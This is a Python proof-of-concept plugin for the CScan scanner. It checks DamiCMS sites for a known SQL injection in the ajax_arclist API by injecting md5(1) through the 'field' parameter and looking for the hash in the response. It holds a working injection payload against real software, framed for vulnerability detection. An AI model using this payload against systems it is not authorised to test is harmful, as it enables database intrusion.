# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'DamiCMS_0001'  # 平台漏洞编号，留空
    name = '大米CMS /Web/Lib/Action/ApiAction.class.php SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-28'  # 漏洞公布时间
    desc = '''
        DamiCMS(大米CMS) SQL注入漏洞，漏洞位于/Web/Lib/Action/ApiAction.class.php，
        过滤不严导致漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'DamiCMS(大米CMS)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'cb5ddf3b-3ef7-4ed5-8a98-6cfd980d0b01'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '''s=/api/ajax_arclist/model/article/field/md5(1)%23'''
            verify_url = ('%s/index.php?%s') % (self.target, payload)
            print(verify_url)
            req = requests.get(verify_url)
            if req.status_code == 200 and 'ca4238a0b923820dcc509a6f75849' in req.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
